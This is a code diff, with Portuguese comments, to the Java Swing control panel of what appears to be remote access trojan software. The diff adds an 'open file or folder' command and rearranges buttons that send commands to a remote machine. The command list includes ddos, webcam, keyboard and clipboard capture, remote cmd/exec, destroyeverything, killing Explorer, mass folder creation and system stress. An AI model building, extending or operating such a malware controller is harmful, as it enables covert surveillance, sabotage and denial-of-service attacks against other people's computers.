@@ -48,7 +48,7 @@ public class ServerGUI extends JFrame {
     // Todos os comandos para autocomplete
     private static final String[] ALL_COMMANDS = {
             "sel", "list", "help", "desel", "control", "mouse", "mousemove", "mousemoveclick", "keyboard", "duplicate", "fps", "ddos", "wallpaper",
-            "functions", "functionspanel", "info", "restart", "debug", "gc", "ping", "ls", "del", "copy", "move", "mkdir", "cd", "view", "receive",
+            "functions", "functionspanel", "info", "restart", "debug", "gc", "ping", "ls", "del", "copy", "move", "mkdir", "cd", "open", "view", "receive",
             "send", "destroyeverything", "download", "zip", "unzip", "audio", "type", "lclick", "mclick", "rclick", "scroll", "history", "screen",
             "webcam", "livestopper", "cmd", "exec", "log", "kill", "listprocess", "clipboard", "msg", "ask", "chat", "voice", "update", "close", "uninstall"
     };
@@ -1177,16 +1177,8 @@ public class ServerGUI extends JFrame {
         panel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));
 
         // -------------------------------------------------
-        // Botão de Liberar Memória
+        // Botões
         // -------------------------------------------------
-        JButton gcButton = new JButton("Liberar Memória");
-        gcButton.addActionListener(e -> ServerGUI.sendDirectCommand("gc"));
-        panel.add(gcButton);
-
-        // -------------------------------------------------
-        // Botões solicitados
-        // -------------------------------------------------
-
         JButton shutdownButton = new JButton("Desligar");
         shutdownButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions shutdown"));
         panel.add(shutdownButton);
@@ -1199,21 +1191,25 @@ public class ServerGUI extends JFrame {
         logoffButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions logoff"));
         panel.add(logoffButton);
 
-        JButton mkdirsButton = new JButton("1000 Pastas");
-        mkdirsButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions mkdirs"));
-        panel.add(mkdirsButton);
+        JButton gcButton = new JButton("Liberar Memória");
+        gcButton.addActionListener(e -> ServerGUI.sendDirectCommand("gc"));
+        panel.add(gcButton);
 
         JButton desktopButton = new JButton("Área de Trabalho");
         desktopButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions desktop"));
         panel.add(desktopButton);
 
+        JButton openExplorerButton = new JButton("Abrir Explorer");
+        openExplorerButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions explorer"));
+        panel.add(openExplorerButton);
+
         JButton killExplorerButton = new JButton("Matar Explorer");
         killExplorerButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions killexplorer"));
         panel.add(killExplorerButton);
 
-        JButton openExplorerButton = new JButton("Abrir Explorer");
-        openExplorerButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions explorer"));
-        panel.add(openExplorerButton);
+        JButton mkdirsButton = new JButton("1000 Pastas");
+        mkdirsButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions mkdirs"));
+        panel.add(mkdirsButton);
 
         JButton stressButton = new JButton("Stress");
         stressButton.addActionListener(e -> ServerGUI.sendDirectCommand("functions stress"));
@@ -1288,9 +1284,17 @@ public class ServerGUI extends JFrame {
         debugButton.addActionListener(e -> ServerGUI.sendDirectCommand("debug"));
         panel.add(debugButton);
 
-        JButton liveStopperButton = new JButton("Live Stopper");
-        liveStopperButton.addActionListener(e -> ServerGUI.sendDirectCommand("livestopper"));
-        panel.add(liveStopperButton);
+        JButton openButton = new JButton("Abrir Arquivo/Pasta");
+        openButton.addActionListener(e -> {
+            String fileName = JOptionPane.showInputDialog(
+                    frame,
+                    "Digite o nome do arquivo ou pasta:"
+            );
+            if (fileName != null && !fileName.trim().isEmpty()) {
+                ServerGUI.sendDirectCommand("open " + fileName);
+            }
+        });
+        panel.add(openButton);
 
         // -------------------------------------------------
         // Configurações finais da janela
